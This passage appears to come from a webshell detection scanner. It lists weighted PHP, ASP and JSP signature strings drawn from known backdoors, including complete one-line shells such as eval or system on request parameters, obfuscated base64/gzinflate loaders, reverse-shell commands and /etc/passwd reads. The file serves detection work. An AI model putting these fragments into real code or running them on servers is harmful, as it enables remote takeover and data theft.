    ("if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f", 90),
    ("if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}", 90),
    ("<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];", 90),
    ("<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna", 90),
    ("echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <", 90),
    ("echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";", 90),
    ("echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>", 90),
    ("while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r", 90),
    ("$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $", 90),
    ("<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle", 90),
    ("echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()", 90),
    ("echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size=", 90),
    ("else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\"", 90),
    ("elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }", 90),
    ("if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell", 90),
    ("$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d", 90),
    ("echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input", 90),
    ("echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\"", 90),
    ("echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P", 90),
    ("echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th", 90),
    ("if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}", 90),
    ("if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB ", 90),
    ("$passwordPrompt = \"\\n=================================================", 90),
    ("$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent", 90),
    ("<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>", 90),
    ("<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">", 90),
    ("@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory.", 90),
    ("echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($", 90),
    ("echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu", 90),
    ("echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=", 90),
    ("echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft", 90),
    ("echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\"..", 90),
    ("fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time", 90),
    ("my $error = \"This command is not available in the restricted mode.\\n\";", 90),
    (" $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$", 90),
    (" Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-", 90),
    ("$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y", 90),
    ("copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);", 90),
    ("echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>", 90),
    ("else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq", 90),
    ("print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&", 90),
    ("$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));", 90),
    ("$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");", 90),
    ("$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV", 90),
    ("echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"", 90),
    ("echo '<option value=\"create function backshell returns string soname", 90),
    ("eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C", 90),
    ("if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru", 90),
    ("if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI", 90),
    ("$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\"", 90),
    ("<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma", 90),
    ("<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma", 90),
    ("echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur", 90),
    ("if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))", 90),
    ("if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";", 90),
    ("if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass", 90),
    ("or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win", 90),
    ("preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is(", 90),
    ("@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6", 90),
    ("$result = dns_get_record($query, $types[$type], $authns, $addtl);", 90),
    ("echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na", 90),
    ("else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec", 90),
    ("if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {", 90),
    ("$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00", 90),
    ("$link = mysql_connect($_POST['host'], $_POST['username'], $_POST", 90),
    (" if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {", 90),
    ("$error_text = '<strong>Failed selecting database \"'.$this->db['", 90),
    ("if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}", 90),
    ("if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}", 90),
    ("$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = ", 90),
    ("echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G", 90),
    ("echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];", 90),
    ("echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";", 90),
    ("echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';", 90),
    ("preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o", 90),
    ("$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA", 90),
    ("$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";", 90),
    ("$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You", 90),
    ("$handle = @opendir($dir) or die(\"Can't open directory $dir\");", 90),
    ("else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";", 90),
    ("if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {", 90),
    ("var command_hist = new Array(<?php echo $js_command_hist ?>);", 90),
    ("$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C", 90),
    ("$bool = $isdiskette = in_array($letter,$safemode_diskettes);", 90),
    ("$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server ", 90),
    ("$nixpwdperpage = 100; // Get first N lines from /etc/passwd ", 90),
    ("echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";", 90),
    ("elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */", 90),
    ("elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ ", 90),
    ("if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {", 90),
    ("$errmsg = 'The file you want Downloadable was nonexistent';", 70),
    ("$string = !empty($_POST['string']) ? $_POST['string'] : 0; ", 70),
    ("<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>", 70),
    ("<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>", 70),
    ("http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix", 70),
    ("if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {", 70),
    ("if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }", 70),
    ("if(!isset($_REQUEST['dir'])) die('hey,specify directory!');", 70),
    ("echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n", 70),
    ("else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {", 70),
    ("foreach($values as $k=>$v) {$values[$k] = addslashes($v);}", 70),
    ("if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)", 70),
    ("if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))", 70),
    ("<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>", 70),
    ("echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>", 70),
    ("if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)", 70),
    ("setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);", 70),
    ("$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';", 70),
    ("$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL).", 70),
    ("@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");", 70),
    ("echo $son.' <br> <font color=\"green\">Access</font><br>';", 70),
    ("foreach($parts as $val)//Assemble the path back together", 70),
    ("$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";", 70),
    ("$query = isset($_POST['query']) ? $_POST['query'] : '';", 70),
    ("$res = mssql_query(\"select * from r57_temp_table\",$db);", 70),
    ("$result = mysql_query($loli12) or die (mysql_error()); ", 70),
    ("&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[", 70),
    ("<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" ", 70),
    ("echo \"<center><b>Server-status variables:</b><br><br>\";", 70),
    ("if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];", 70),
    ("search_file($_POST['search'],urldecode($_POST['dir']));", 70),
    ("system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD", 70),
    ("$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);", 70),
    ("$process = proc_open($shell, $descriptorspec, $pipes);", 70),
    ("$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); ", 70),
    ("<form action=<?=$script?>?act=backconnect method=POST>", 70),
    ("echo \"<font size='1' color='#999999'>Dont in windows\";", 70),
    ("else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";", 70),
    ("$connection = @ftp_connect($ftp_server,$ftp_port,10);", 70),
    ("$uploadfile = $_POST['path'].$_FILES['file']['name'];", 70),
    ("echo \"<b>Result of execution this PHP-code</b>:<br>\";", 70),
    ("header(\"Content-Length: \".filesize($_POST['downf']));", 70),
    ("$encoded = base64_encode(file_get_contents($d.$f)); ", 70),
    ("<form action=<?=$script?>?act=bindshell method=POST>", 70),
    ("echo \"<head><title>Safe Mode Shell</title></head>\"; ", 70),
    ("elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} ", 70),
    ("setcookie($cookiename, $_POST['pass'], time()+3600);", 70),
    ("$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";", 70),
    ("$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);", 70),
    ("$mainpath_info           = explode('/', $mainpath);", 70),
    ("<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>", 70),
    ("elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}", 70),
    ("$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));", 70),
    ("$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].", 70),
    ("$token = substr($_REQUEST['command'], 0, $length);", 70),
    ("echo \"<title>Edited By KingDefacer</title><body>\";", 70),
    ("foreach(@file($_POST['passwd']) as $fed)echo $fed;", 70),
    ("foreach(string innerSubKey in sk.GetSubKeyNames())", 70),
    ("var_dump(@$shell->RegRead($_POST['readregname']));", 70),
    ("$content = chunk_split(base64_encode($content)); ", 70),
    ("$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']", 70),
    ("<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO", 70),
    ("@preg_replace('/ad/e','@'.str_rot13('riny').'($ww", 70),
    (" $_POST['cmd']=\"echo \\\"Now script try connect to", 70),
    ("$fileperm=base_convert($_POST['fileperm'],8,10);", 70),
    ("$from = rand (71,1020000000).\"@\".\"Attacker.com\";", 70),
    ("$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];", 70),
    ("$uploadfile = $dirupload.\"/\".$_POST['filename'];", 70),
    ("<form action=<?=$script?>?act=mkdir method=POST>", 70),
    ("echo \"<font color=blue>[$USERNAME]</font> - \\n\";", 70),
    ("echo \"<p align=center>Dosya Zaten Bulunuyor</p>\"", 70),
    ("echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"", 70),
    ("echo '<option value=\"select cmdshell(\\'net user ", 70),
    ("if(@$_POST['save'])writef($file,$_POST['data']);", 70),
    ("$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");", 70),
    ("$name='63a9f0ea7bb98050796b649e85481845';//root", 70),
    ("$query = \"SHOW COLUMNS FROM \" . $_GET['table'];", 70),
    ("$scriptident = \"$scriptTitle By Evilc0der.com\";", 70),
    ("$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; ", 70),
    ("<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>", 70),
    ("preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"", 70),
    ("$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";", 70),
    ("echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy", 70),
    ("if (isset($_POST['wq']) && $_POST['wq']<>\"\") {", 70),
    ("@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); ", 70),
    ("$dump = \"-- Database: \".$_POST['db'] .\" \\n\";", 70),
    ("$free_percent = round(100/($total/$free),2);", 70),
    (":<b>\" .base64_decode($_POST['tot']). \"</b>\";", 70),
    ("echo \"[-] Error : coudn't read /etc/passwd\";", 70),
    ("echo $lang[$language.'_text98'].$suc.\"\\r\\n\";", 70),
    ("if (!$bool) {$bool = is_dir($letter.\":\\\\\");}", 70),
    ("preg_replace(\"/[errorpage]/e\",$page,\"saft\");", 70),
    ("$new_dir = $regs[1]; // 'cd /something/...'", 70),
    ("$sock = @ftp_connect($host,$port,$timeout);", 70),
    ("$stream = imap_open(\"/etc/passwd\", \"\", \"\");", 70),
    ("function addFile($data, $name, $time = 0) {", 70),
    ("echo base64_decode($images[$_GET['pic']]);", 70),
    ("if (mkdir($_POST['dir'], 0777) == false) {", 70),
    ("if($_POST['root']) $root = $_POST['root'];", 70),
    ("$adminEmail = \"youremail@yourserver.com\";", 70),
    ("$pass='abcdef1234567890abcdef1234567890';", 70),
    ("$function=passthru; // system, exec, cmd", 70),
    ("$name='ec371748dc2da624b35a4f8f685dd122'", 70),
    ("<? if ($ekinci==\".\" or  $ekinci==\"..\") {", 70),
    ("else if( $mode & 0x6000 ) { $type='b'; }", 70),
    ("eval(gzinflate(str_rot13(base64_decode('", 70),
    ("if ($file==\".\" || $file==\"..\") continue;", 70),
    ("if ($filestealth) {$stat = stat($d.$f);}", 70),
    ("if (posix_kill($pid,$sig)) {echo \"OK.\";}", 70),
    ("$input = fread($pipes[1], $chunk_size);", 70),
    ("$shell = 'uname -a; w; id; /bin/sh -i';", 70),
    ("$tmpfile = tempnam('/tmp', 'phpshell');", 70),
    ("<?php eval(gzuncompress(base64_decode(\"", 70),
    ("@eval(gzinflate(base64_decode($code)));", 70),
    ("@eval(stripslashes($_POST['phpcode']));", 70),
    ("echo sr(15,\"<b>\".$lang[$language.'_text", 70),
    ("if ($uid) {echo join(\":\",$uid).\"<br>\";}", 70),
    ("$filename = $backupstring.\"$filename\";", 70),
    ("$md5_pass = \"\"; //If no pass then hash", 70),
    ("$owner  = ($mode & 00400) ? 'r' : '-';", 70),
    ("echo \"<font color=blue>Error!</font>\";", 70),
    ("echo '<PRE><P>This is exploit from <a ", 70),
    ("function unix2DosTime($unixtime = 0) {", 70),
    ("my $command = $self->query('command');", 70),
    ("$i = pack('c*', 0x70, 0x61, 99, 107);", 70),
    ("$arr = array_merge($arr, glob(\"*\"));", 70),
    ("$logo = \"R0lGODlhMAAwAOYAAAAAAP////r", 70),
    ("$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";", 70),
    ("foreach (array_keys($types) as $t) {", 70),
    ("if(!is_numeric($_POST['timelimit']))", 70),
    ("$_POST['installpath'] = \"temp.pl\";}", 70),
    ("$liz0zim=shell_exec($_POST[liz0]); ", 70),
    ("$num = $nixpasswd + $nixpwdperpage;", 70),
    ("if ($_SERVER[\"REMOTE_ADDR\"] == $IP)", 70),
    ("if ($total === FALSE) {$total = 0;}", 70),
    ("if( $_POST['_act'] == \"Upload!\" ) {", 70),
    ("if(!$whoami)$whoami=exec(\"whoami\");", 70),
    ("while (($ekinci=readdir ($sedat))){", 70),
    ("        $cmd = ($_REQUEST['cmd']);", 70),
    ("$baglan=fopen(\"/tmp/$ekinci\",'r');", 70),
    ("$commander = $_POST['commander']; ", 70),
    ("$hardstyle = explode(\"/\", $file); ", 70),
    ("<?php $s=@$_GET[2];if(md5($s.$s)==", 70),
    ("eval(\"?>\".gzinflate(base64_decode(", 70),
    ("if(($_POST['exe']) == \"Execute\") {", 70),
    ("if(empty($fu)) $fu = @$_GET['fu'];", 70),
    ("while ($file = readdir($folder)) {", 70),
    (";$sd98=\"john.barker446@gmail.com\"", 70),
    ("<? eval(gzinflate(base64_decode('", 70),
    ("@extract($_REQUEST[\"c99shcook\"]);", 70),
    ("echo \"<br>Banner: $get <br><br>\";", 70),
    ("foreach($quicklaunch2 as $item) {", 70),
    ("if (isset($_GET['rename_all'])) {", 70),
    ("$entry_line=\"HACKed by EntriKa\";", 70),
    ("$liz0=shell_exec($_POST[baba]); ", 70),
    ("$sourcego = $_POST['sourcego']; ", 70),
    ("$to1=str_replace(\"//\",\"/\",$to1);", 70),
    ("<?php ${${eval($_POST[ice])}};?>", 70),
    ("<?php assert($_REQUEST[\"c\"]);?> ", 70),
    ("<?php echo exec('killall nc');?>", 70),
    ("foreach($filelist as $filename){", 70),
    ("$string = explode(\"|\",$string);", 70),
    ("@$ftp=ftp_connect('127.0.0.1');", 70),
    ("if(empty($_POST['Mohajer22'])){", 70),
    ("if(isset($_POST[\"newcontent\"]))", 70),
    ("$baglan=fopen($duzkaydet,'w');", 70),
    ("$fh2 = fopen(\"evex.php\", 'a');", 70),
    ("$v = @ini_get(\"open_basedir\");", 70),
    ("<? $cmd = $_REQUEST[\"-cmd\"];?>", 70),
    ("eval(gzinflate(base64_decode('", 70),
    ("foreach ($allowedIPs as $IP) {", 70),
    ("} else if ($command == 'ls') {", 70),
    ("$Comments=$_POST['Comments'];", 45),
    ("$dires = $dires . $directory;", 45),
    ("$fqb_lenght = $nixpwdperpage;", 45),
    ("$pass = md5(md5(md5($pass)));", 45),
    ("$ret = myshellexec($handler);", 45),
    ("$ret = posix_kill($pid,$sig);", 45),
    ("echo \"FILE UPLOADED TO $dez\";", 45),
    ("echo $uname.\"</font><br><b>\";", 45),
    ("eval(gzinflate(base64_decode(", 45),
    ("foreach ($arr as $filename) {", 45),
    ("if($_POST['chars'] == \"9999\")", 45),
    ("$d=str_replace(\"\\\\\",\"/\",$d);", 45),
    ("$dono = get_current_user( );", 45),
    ("$dt = $_POST['filecontent'];", 45),
    ("<?php ($www= $_POST['ice'])!", 45),
    ("if( $action == \"dumpTable\" )", 45),
    ("if(isset($_REQUEST['cmd'])){", 45),
    ("if(rmdir($_POST['mk_name']))", 45),
    ("$backupstring = \"copy_of_\";", 45),
    ("$default_charset = \"UTF-8\";", 45),
    ("$expurl= $url.\"?id=\".$sql ;", 45),
    ("$ret = shellexec($command);", 45),
    ("echo \"<b>HEXDUMP:</b><nobr>", 45),
    ("echo decode(execute($cmd));", 45),
    ("$adres=gethostbyname($ip);", 45),
    ("$cmd = ($_REQUEST['cmd']);", 45),
    ("$deger2= \"$ich[$tampon4]\";", 45),
    ("$dl=$_REQUEST['downloaD'];", 45),
    ("$f=fopen($_POST[\"f\"],\"w\");", 45),
    ("$res = @ob_get_contents();", 45),
    ("$s=sprintf(\"%1s\", $type); ", 45),
    ("<?php eval($_POST[1]);?>  ", 45),
    ("\\$port = {$_POST['port']};", 45),
    ("if($_POST['king'] == \"\") {", 45),
    ("if(empty(\\$_POST['cmd'])){", 45),
    ("$curcmd = $_POST['king'];", 45),
    ("$res = @shell_exec($cfe);", 45),
    ("if (!empty($_POST['c'])){", 45),
    ("if(empty($_GET['file'])){", 45),
    ("$cookiename = \"wieeeee\";", 45),
    ("$fname = $_GET['fname'];", 45),
    ("$login = \"user\"; //Login", 45),
    ("$uname = posix_uname( );", 45),
    ("$yazi = \"test\" . \"\\r\\n\";", 45),
    ("if($sertype == \"winda\"){", 45),
    ("  system($_GET['cmd']);", 45),
    ("$_POST['backconnectip']", 45),
    ("$_POST['cmd'] = which('", 45),
    ("$bindport_pass = \"c99\";", 45),
    ("$currentCMD = \"ls -la\";", 45),
    ("$pass = \"pass\";  //Pass", 45),
    ("@include($_GET['bug']);", 45),
    ("echo --==Userinfo==-- ;", 45),
    ("if($action==\"phpeval\"){", 45),
    ("        echo \"</pre>\";", 45),
    ("$_POST['backcconnmsg']", 45),
    ("$data = $_GET['data'];", 45),
    ("echo shell_exec($com);", 45),
    ("passthru($_POST['c']);", 45),
    ("        echo \"<pre>\";", 45),
    ("$cmd = $_POST['cmd'];", 45),
    ("{eval($_GET['idc']);}", 45),
    ("$curcmd = \"ls -lah\";", 45),
    ("$login = \"\"; //Login", 45),
    ("$u1p=$_POST['copy'];", 45),
    ("@$rto=$_POST['rto'];", 45),
    (" $aa = $_GET['aa'];", 45),
    ("$pass = \"\";  //Pass", 45),
    ("$tampon4=$tampon3-1", 45),
    ("echo ws(2).$lb.\" <a", 45),
    ("if ($_POST['cmd']){", 45),
    ("$dir=getcwd().\"/\";", 45),
    ("$m=$_POST['curl'];", 45),
    ("$succ = \"Warning! ", 45),
    ("<b>\".$_POST['cmd']", 45),
    ("echo system($com);", 45),
    ("if($_GET['cmd']) {", 45),
    ("$Python_CODE = \"I", 45),
    ("$i = $nixpasswd;", 45),
    ("echo \"<login_ok>", 45),
]

# YARA_ASP_SIGS —— 来源: Yara-Rules 社区库 webshells/ (THOR APT Scanner webshell 子集等)
YARA_ASP_SIGS = [
    ("<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi", 90),
    ("<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></", 90),
    ("<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F", 90),
    ("<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser", 90),
    ("Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><", 90),
    ("response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &", 90),
    ("theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli", 90),
    ("response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com", 90),
    ("response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&", 90),
    ("response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio", 90),
    ("<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S", 90),
    ("<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application", 90),
    ("<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">", 90),
    ("Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" ", 90),
    ("if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest", 90),
    ("if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g", 90),
    (" FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi", 90),
    ("<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s", 90),
    ("Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&", 90),
    ("if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor", 90),
    ("<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private", 90),
    ("<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request.", 90),
    ("<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>", 90),
    ("Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\"", 90),
    ("Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.", 90),
    ("String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ", 90),
    ("action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>", 90),
    ("<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java.", 90),
    ("<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja", 90),
    ("<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f", 90),
    ("<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques", 90),
    ("<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx", 90),
    ("String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z", 90),
    ("remoteIp = HttpContext.Current.Request.Headers[\"X-Forwarded-For\"].Split(new", 90),
    ("&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE", 90),
    ("if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req", 90),
    ("FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");", 90),
    ("Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas", 90),
    ("String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"", 90),
    ("<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\"", 90),
    ("Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))", 90),
    ("result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR", 90),
    ("Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\"", 90),
    ("if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))", 90),
    ("<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url", 90),
    ("Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam", 90),
    ("String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859", 90),
    ("</font><%out.print(request.getRealPath(request.getServletPath())); %>", 90),
    ("seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf", 90),
    ("%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%", 90),
    ("Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));", 90),
    ("case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive", 90),
    ("<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>", 90),
    ("Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")", 90),
    ("out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");", 90),
    ("<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c", 90),
    ("'response.write \"<br/>  -value:\" & request.querystring(key)(j)", 90),
    ("//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p", 90),
    ("Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/", 90),
    ("set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '", 90),
    ("<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")", 70),
    ("// String tempfilepath=request.getParameter(\"filepath\");", 70),
